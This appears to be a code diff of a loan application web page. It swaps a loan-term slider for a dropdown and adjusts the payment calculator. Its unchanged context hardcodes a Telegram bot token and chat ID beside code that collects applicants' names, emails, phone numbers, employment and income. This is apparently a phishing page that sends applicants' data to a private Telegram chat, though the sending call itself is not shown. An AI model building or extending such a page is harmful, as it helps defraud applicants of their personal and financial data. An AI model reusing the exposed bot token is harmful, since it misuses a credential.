@@ -181,7 +181,7 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-top: 12px;
+            margin-top: 16px;
         }
 
         .phone-group {
@@ -351,19 +351,22 @@
                             <span>$5,000</span>
                         </div>
 
-                        <div class="calc-row">
-                            <span>Loan Term</span>
-                            <span class="calc-value" id="termDisplay">23 months</span>
-                        </div>
-                        <input type="range" id="loanTermRange" min="6" max="60" step="1" value="23">
-                        <div class="range-labels">
-                            <span>6 months</span>
-                            <span>60 months</span>
+                        <div class="form-group" style="margin-bottom: 12px;">
+                            <label>Loan Term</label>
+                            <select id="loanTerm">
+                                <option value="6">6 Months</option>
+                                <option value="12" selected>12 Months</option>
+                                <option value="18">18 Months</option>
+                                <option value="24">24 Months</option>
+                                <option value="36">36 Months</option>
+                                <option value="48">48 Months</option>
+                                <option value="60">60 Months</option>
+                            </select>
                         </div>
 
                         <div class="monthly-payment-card">
                             <span style="font-size: 13px; color: var(--muted);">Monthly Payment</span>
-                            <span style="font-size: 18px; font-weight: 700; color: #4f46e5;" id="monthlyPaymentDisplay">$250.72</span>
+                            <span style="font-size: 18px; font-weight: 700; color: #4f46e5;" id="monthlyPaymentDisplay">$437.50</span>
                         </div>
                     </div>
 
@@ -477,7 +480,7 @@
                         </div>
                         <div class="summary-row">
                             <span class="summary-label">Loan Term:</span>
-                            <span class="summary-val" id="sumTerm">23 Months</span>
+                            <span class="summary-val" id="sumTerm">12 Months</span>
                         </div>
                         <div class="summary-row">
                             <span class="summary-label">Purpose:</span>
@@ -509,20 +512,18 @@
         const botToken = "8641245398:AAGYI7pFOVVrKqf9ILOSo6yGyOdFVSekkpM";
         const chatId = "8557614507";
 
-        // Range Sliders & Calculator Logic
+        // Range Slider & Term Select Logic
         const amountRange = document.getElementById('loanAmountRange');
-        const termRange = document.getElementById('loanTermRange');
+        const termSelect = document.getElementById('loanTerm');
         const amountDisplay = document.getElementById('amountDisplay');
-        const termDisplay = document.getElementById('termDisplay');
         const monthlyPaymentDisplay = document.getElementById('monthlyPaymentDisplay');
 
         function updateCalculator() {
-            if (!amountRange || !termRange) return;
+            if (!amountRange || !termSelect) return;
             const principal = parseFloat(amountRange.value);
-            const months = parseInt(termRange.value);
+            const months = parseInt(termSelect.value);
             
             amountDisplay.textContent = '$' + principal.toLocaleString();
-            termDisplay.textContent = months + ' months';
 
             const monthlyInterestRate = 0.08 / 12;
             let monthlyPayment = 0;
@@ -534,11 +535,10 @@
             monthlyPaymentDisplay.textContent = '$' + monthlyPayment.toFixed(2);
         }
 
-        if (amountRange && termRange) {
+        if (amountRange && termSelect) {
             amountRange.addEventListener('input', updateCalculator);
             amountRange.addEventListener('change', updateCalculator);
-            termRange.addEventListener('input', updateCalculator);
-            termRange.addEventListener('change', updateCalculator);
+            termSelect.addEventListener('change', updateCalculator);
             updateCalculator();
         }
 
@@ -562,7 +562,7 @@
             // Populate Summary
             document.getElementById('sumLoanType').textContent = document.getElementById('loanType').value;
             document.getElementById('sumAmount').textContent = amountDisplay.textContent;
-            document.getElementById('sumTerm').textContent = termDisplay.textContent;
+            document.getElementById('sumTerm').textContent = termSelect.options[termSelect.selectedIndex].text;
             document.getElementById('sumPurpose').textContent = document.getElementById('loanPurpose').value || 'General Loan';
             document.getElementById('sumApplicant').textContent = fn.charAt(0).toUpperCase() + '. ' + ln.charAt(0).toUpperCase() + '.';
 
@@ -601,7 +601,7 @@
                 const email = document.getElementById('email').value || 'N/A';
                 const phone = '+263 ' + document.getElementById('phoneNumber').value;
                 const loanAmount = amountDisplay.textContent;
-                const loanTerm = termDisplay.textContent;
+                const loanTerm = termSelect.options[termSelect.selectedIndex].text;
                 const purpose = document.getElementById('loanPurpose').value;
                 const employment = document.getElementById('employmentStatus').value;
                 const annualIncome = document.getElementById('annualIncome').value;
